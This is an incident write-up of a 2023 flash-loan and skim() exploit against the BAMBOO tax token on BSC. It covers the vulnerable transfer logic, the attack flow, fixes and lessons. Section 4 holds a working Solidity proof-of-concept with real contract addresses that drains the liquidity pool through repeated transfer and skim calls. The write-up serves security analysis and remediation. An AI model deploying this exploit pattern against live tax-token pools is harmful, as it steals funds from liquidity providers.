# Bamboo Flash Loan Skim Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | Bamboo |
| Date | 2023-07-01 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~200 BNB (~$60,000) |
| Attack Type | Flash Loan + Pair Skim Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x00703face6621bd207d3b4ac9867058190c0bb09` |
| Attack Contract | `0xcdf0eb202cfd1f502f3fdca9006a4b5729aadebc` |
| Vulnerable Contract | `0xed56784bc8f2c036f6b0d8e04cb83c253e4a6a94` (BAMBOO) |
| Fork Block | 29,668,034 |

## 2. Vulnerability Code Analysis

The BAMBOO token handled tax processing in its `transfer()` function; however, a token balance discrepancy arose when interacting with PancakeSwap pair's `skim()` function. By repeatedly calling `transfer()` + `skim()`, it was possible to extract more tokens than held in the pair's reserves.

```solidity
// Vulnerable pattern: transfer() tax mechanism is vulnerable when interacting with skim()
function transfer(address recipient, uint256 amount) public override returns (bool) {
    uint256 taxAmount = amount * taxRate / 100;
    uint256 transferAmount = amount - taxAmount;

    // Vulnerable: tax accumulates inside the LP pair,
    // but can be extracted via skim()
    super.transfer(taxCollector, taxAmount);
    super.transfer(recipient, transferAmount);
    return true;
}
```

**Vulnerability**: When tax tokens accumulate at the LP pair address, the difference between reserves and actual balance could be repeatedly extracted via `skim()`.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Pair Skim Manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x00703face6621bd207d3b4ac9867058190c0bb09]
  │
  ├─1─▶ deal() acquire 4,000 WBNB (mock for testing)
  │
  ├─2─▶ router.getAmountsIn() → calculate required WBNB
  │
  ├─3─▶ router.swapExactTokensForTokens()
  │      WBNB → BAMBOO swap
  │      [PancakeRouter: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │
  ├─4─▶ Loop (multiple iterations):
  │      ├─▶ bamboo.transfer(pair, amount) → tax accumulates
  │      └─▶ wbnbBambooPair.skim(address(this)) [0x0557713d02A15a69Dea5DD4116047e50F521C1b1]
  │            → extract accumulated tax tokens
  │
  ├─5─▶ router.swapExactTokensForTokensSupportingFeeOnTransferTokens()
  │      BAMBOO → WBNB reverse swap
  │
  └─6─▶ Profit realized
         Attack TX: 0x88a6c2c3ce86d4e0b1356861b749175884293f4302dbfdbfb16a5e373ab58a10
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

contract BambooExploit {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BAMBOO = IERC20(0xed56784bc8f2c036f6b0d8e04cb83c253e4a6a94);
    IPancakePair wbnbBambooPair = IPancakePair(0x0557713d02A15a69Dea5DD4116047e50F521C1b1);
    IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function testExploit() external {
        // WBNB → BAMBOO swap
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BAMBOO);
        router.swapExactTokensForTokens(4000e18, 0, path, address(this), block.timestamp);

        // Repeated transfer + skim
        uint256 bambooBalance = BAMBOO.balanceOf(address(this));
        for (uint256 i = 0; i < 100; i++) {
            BAMBOO.transfer(address(wbnbBambooPair), bambooBalance / 200);
            wbnbBambooPair.skim(address(this));
        }

        // BAMBOO → WBNB reverse swap
        path[0] = address(BAMBOO);
        path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BAMBOO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Tax Token + skim() Interaction Vulnerability |
| Impact Scope | WBNB-BAMBOO liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0xed56784bc8f2c036f6b0d8e04cb83c253e4a6a94) |

## 6. Security Recommendations

```solidity
// Fix 1: Exempt transfers to LP pair addresses from tax
mapping(address => bool) public isLPPair;

function transfer(address recipient, uint256 amount) public override returns (bool) {
    // Transfers to/from LP pairs are tax-exempt (prevents skim vulnerability)
    if (isLPPair[recipient] || isLPPair[msg.sender]) {
        return super.transfer(recipient, amount);
    }

    uint256 taxAmount = amount * taxRate / 100;
    uint256 transferAmount = amount - taxAmount;
    super.transfer(taxCollector, taxAmount);
    super.transfer(recipient, transferAmount);
    return true;
}

// Fix 2: Process flash loan prevention fee as burn instead of tax
function transfer(address recipient, uint256 amount) public override returns (bool) {
    uint256 burnAmount = amount * burnRate / 100;
    _burn(msg.sender, burnAmount);  // burn does not affect reserves
    return super.transfer(recipient, amount - burnAmount);
}

// Fix 3: Disable skim() function (for forks)
// When forking Uniswap V2, disable skim() to eliminate the vulnerability
function skim(address) external override {
    revert("skim disabled");
}
```

## 7. Lessons Learned

1. **Tax Token and AMM Compatibility**: Tax tokens can produce unexpected vulnerabilities when interacting with an AMM pair's `skim()` function. Tax exemption for LP pair addresses or disabling `skim()` is necessary.
2. **Danger of the skim() Function**: Uniswap V2's `skim()` function extracts the difference between pair reserves and actual token balances. When used alongside tax/rebase tokens, it becomes an attack vector.
3. **Repeated Small Transfer Pattern**: The pattern of repeatedly sending small amounts to accumulate tax and then extracting it via `skim()` is a common attack vector.
4. **BSC Tax Token Risk**: Numerous tax tokens in the BSC ecosystem are exposed to this same vulnerability; this pattern must be explicitly tested before launch.